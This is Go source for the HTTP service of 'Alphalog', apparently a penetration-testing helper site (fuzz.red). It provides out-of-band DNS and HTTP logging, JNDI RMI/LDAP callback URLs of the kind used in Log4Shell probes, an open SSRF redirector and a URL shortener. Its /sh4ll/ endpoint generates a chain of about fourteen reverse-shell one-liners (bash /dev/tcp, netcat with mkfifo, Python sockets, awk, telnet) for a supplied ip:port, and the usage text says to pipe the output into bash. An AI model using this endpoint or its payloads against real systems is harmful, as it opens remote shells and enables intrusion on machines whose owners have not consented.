package Service

import (
	"Alphalog/Config"
	"encoding/json"
	"fmt"
	"github.com/gofrs/uuid"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"
)

type JsonResult  struct{
	Code int `json:"code"`
	Data  []string `json:"data"`
}
type GenerateKey  struct{
	Key string `json:"key"`
	SubDomain  string `json:"subdomain"`
	RMI  string `json:"rmi"`
	LDAP  string `json:"ldap"`
}

/*
Code
666		正确存在
555		不存在
*/

var Banner = `
  $$$$$$\  $$\           $$\                 $$\                          
 $$  __$$\ $$ |          $$ |                $$ |                         
 $$ /  $$ |$$ | $$$$$$\  $$$$$$$\   $$$$$$\  $$ |      $$$$$$\   $$$$$$\  
 $$$$$$$$ |$$ |$$  __$$\ $$  __$$\  \____$$\ $$ |     $$  __$$\ $$  __$$\ 
 $$  __$$ |$$ |$$ /  $$ |$$ |  $$ | $$$$$$$ |$$ |     $$ /  $$ |$$ /  $$ |
 $$ |  $$ |$$ |$$ |  $$ |$$ |  $$ |$$  __$$ |$$ |     $$ |  $$ |$$ |  $$ |
 $$ |  $$ |$$ |$$$$$$$  |$$ |  $$ |\$$$$$$$ |$$$$$$$$\\$$$$$$  |\$$$$$$$ |
 \__|  \__|\__|$$  ____/ \__|  \__| \_______|\________|\______/  \____$$ |
               $$ |                                             $$\   $$ |
               $$ |                 By:Alphabug                 \$$$$$$  |
               \__|                 Version:1.0.0.Releases       \______/`
var letterRunes = []rune("abcdefghijklmnopqrstuvwxyz1234567890")
func RandStringRunes(n int) string {
	rand.Seed(time.Now().Unix())
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}
func subdomain_http(w http.ResponseWriter, r *http.Request)(bool bool) {
	log.Println("[subdomain_http]",r.Host)
	check_subdomain_flag,_,subdomain := RDB.Check_subdomain(r.Host+".")
	if check_subdomain_flag{
		ip, _, _ := net.SplitHostPort(r.RemoteAddr)
		body, _ := ioutil.ReadAll(r.Body)

		httplog := map[string]interface{}{
			"url":r.URL.String(),
			"headers":r.Header.Clone(),
			"data":string(body),
		}
		fmt.Fprintln(w,"ok")
		result := RDB.Log_data("http",r.Host,ip,httplog)
		RDB.PUSH(subdomain+"log",result)
		return false
	}
	return true
}
func IndexHandler(w http.ResponseWriter, r *http.Request) {

	w.Header().Set("Access-Control-Allow-Origin", "*")
	w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT")
	// 短链接
	if ok, _ := RDB.Exist("url_"+r.URL.Path[1:] + "." + Config.Init.Domain);ok ==1 {
		url_i,_:=RDB.GET("url_"+r.URL.Path[1:] + "." + Config.Init.Domain)
		w.Header().Set("cache-control", "must-revalidate, no-store")
		w.Header().Set("content-type", " text/html;charset=utf-8")
		w.Header().Set("location",url_i)
		w.WriteHeader(302)
		return
	}
	if subdomain_http(w,r) {
		key := r.PostFormValue("key")
		url := r.PostFormValue("url")
		if  key != "" {
			ok, _ := RDB.Exist(key)
			if ok == 1{
				dnslog_key, _ := RDB.GET(key)
				log.Println(key, dnslog_key)
				if res, _ := RDB.Exist(dnslog_key); res == 1 {
					/*
						判断 Host是否为 dnslog的主要域名，例如：qq.fuzz.red为主dnslog域名。
						那么记录 aaa.qq.fuzz.red就为qq.fuzz.red记录
						返回数据为Json数据，格式为：{"code":200,"Data":["……","……"]}
						200 正常
						403 key错误
						500 无法查找到dnslog日志
					*/

					A_result, _ := RDB.RANGE(dnslog_key)
					result_list := make([]interface{},len(A_result.([]string)))
					for i := 0; i < len(A_result.([]string)); i++ {
						A := map[string]interface{}{}
						B := A_result.([]string)[i]
						json.Unmarshal([]byte(B),&A)
						result_list[i] = A
					}
					Result := map[string]interface{}{
						"code":200,
						"data":result_list,
					}
					Data, _ := json.Marshal(Result)
					w.Write(Data)
				}else {
					Data, _ := json.Marshal(JsonResult{500, []string{"Data Error"}})
					w.Write(Data)
				}
			}else {
				Data, _ := json.Marshal(JsonResult{403, []string{"Domain Expired"}})
				w.Write(Data)
			}
		}else	if url != "" {
			URL_Random := ""
			URL_LOG := ""
			for {
				URL_Random = RandStringRunes(4)		//生成子域名的长度设置为4位随机字符
				URL_LOG = "url_"+URL_Random + "." + Config.Init.Domain
				if ok, _ := RDB.Exist(URL_LOG); ok == 0 {
					break
				}
			}
			RDB.SET(URL_LOG,url)
			port := ""
			if Config.Init.PORT_HTTP == "80"{
				port = ""
			}else {
				port = ":"+Config.Init.PORT_HTTP
			}
			data := "http://"+Config.Init.Domain+port+"/"+URL_Random
			fmt.Fprintln(w,data)
		}else{
			fmt.Fprintln(w, Banner)
			fmt.Fprintln(w,"# Welcome to Fuzz.Red #")
			fmt.Fprintln(w,`Usage:
1.Get Token and The randomly named subdomain (Expires:1 Day)
$ curl fuzz.red/get
=>	{"key":"63d755be-9683-40a9-91fb-b85890155872","subdomain":"oz4e.fuzz.red","rmi":"rmi://jndi.fuzz.red:5/oz4e/","ldap":"ldap://jndi.fuzz.red:5/oz4e/Alphabug"}

2.Get Log
$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872"
=>	{"code":200,"data":[]}
------------------------------------------
# DNSLOG
ping -c 1 oz4e.fuzz.red

# HTTPLOG
curl oz4e.fuzz.red -d "abc"

# SSRF
$ curl -L fuzz.red/ssrf/www.baidu.com/
=> <!DOCTYPE html>...(www.baidu.com page)...</html>

# 短链接
$ curl fuzz.red -X POST -d "url=http://www.baidu.com"
=> http://fuzz.red/n7rs

# 自定义反弹shell
$ curl fuzz.red/sh4ll/ip:port
server
=> $ curl fuzz.red/sh4ll/1.2.3.4:1234 | bash
or $ curl fuzz.red/sh4ll/1.2.3.4:1234 | sh

# RMI or LDAP
=> 例如：子域名=oz4e.fuzz.red，text=Alphabug
=> rmi://jndi.fuzz.red:5/oz4e/Alphabug | ldap://jndi.fuzz.red:5/oz4e/Alphabug

# 查看Log
$ curl fuzz.red -X POST -d "key=63d755be-9683-40a9-91fb-b85890155872" | python -m json.tool
=> {
		"Code": 200,
		"Data": [
			{
				"ip": "1.2.3.4:41584",
				"reqbody": "Alphabug",
				"subdomain": "oz4e.fuzz.red.",
				"time": "2022-01-16 03:40:03 -0500 EST",
				"type": "ldap"
			}
		]
	}

=> 免责声明：
当您使用fuzz.red项目时，默认您已经同意以下条款：
本项目仅供网站管理人员、渗透测试人员学习与交流,任何使用本项目进行的一切未授权攻击行为与本人无关，使用者必须履行http://www.gnu.org/licenses/gpl-2.0.html 协议与准则。
`)
		}

	}
}
func Generate(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Access-Control-Allow-Origin","*")
	w.Header().Set("Access-Control-Allow-Methods","GET, POST, PUT")

	key := uuid.Must(uuid.NewV4())
	w.Header().Set("content-type","application/json")
	log.Println("Generate Key:", key)
	subdomain := ""
	for {
		subdomain = RandStringRunes(4) + "." + Config.Init.Domain		//生成子域名的长度设置为4位随机字符
		if ok, _ := RDB.Exist(subdomain + ".log"); ok == 0 {
			break
		}
	}
	RDB.SET(key.String(), subdomain+".log")
	RDB.PUSH(subdomain+".log", key.String())
	jndi_URL := "://jndi."+Config.Init.IP_JNDI+":"+Config.Init.PORT_JNDI+"/"+subdomain[:4]
	Data, _ := json.Marshal(GenerateKey{key.String(), subdomain,"rmi"+jndi_URL,"ldap"+jndi_URL})
	w.Write(Data)
}

func Ssrf(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("cache-control", "must-revalidate, no-store")
	w.Header().Set("content-type", " text/html;charset=utf-8")
	w.Header().Set("location","http://"+r.URL.Path[6:])
	log.Println("[Ssrf]","http://"+r.URL.Path[6:])
	w.WriteHeader(302)
}
func sh4ll(w http.ResponseWriter, r *http.Request) {
	//log.Println("[sh4ll]",r.Host)

	ip,port := "",""
	payload_list := []string{}
	payload := ""
	if len(r.URL.Path[7:]) == 4  {
		ip_port:=strings.Split(r.URL.Path[7:],":")
		ip,port = ip_port[0],ip_port[1]
		payload_list = append(payload_list,fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("/bin/bash -i > /dev/tcp/%s/%s 0<& 2>&1",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do $line 2>&5 >&5; done",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("exec /bin/sh 0</dev/tcp/%s/%s 1>&0 2>&0",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("rm -f /tmp/p; mknod /tmp/p p && nc %s %s 0/tmp/p 2>&1",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("rm f;mkfifo f;cat f|/bin/sh -i 2<&1|nc %s %s < f",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("rm -f x; mknod x p && nc %s %s 0<x | /bin/bash 1>x",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("mknod backpipe p && nc %s %s 0<backpipe | /bin/bash 1>backpipe",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("awk 'BEGIN {s = \"/inet/tcp/0/%s/%s\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",ip,port))
		payload_list = append(payload_list,fmt.Sprintf("rm -f /tmp/p; mknod /tmp/p p && telnet %s %s 0/tmp/p 2>&1\n",ip,port))
		for i := 0; i < len(payload_list); i++ {
			payload = payload + "("+payload_list[i]+")||"
		}
		payload = payload[:len(payload)-2]
	}

	w.Write([]byte(payload))
}

func Httpserver() {
	http.HandleFunc("/", IndexHandler)
	http.HandleFunc("/get", Generate)
	http.HandleFunc("/ssrf/", Ssrf)
	http.HandleFunc("/sh4ll/", sh4ll)
	http.ListenAndServe("0.0.0.0:"+Config.Init.PORT_HTTP, nil)
}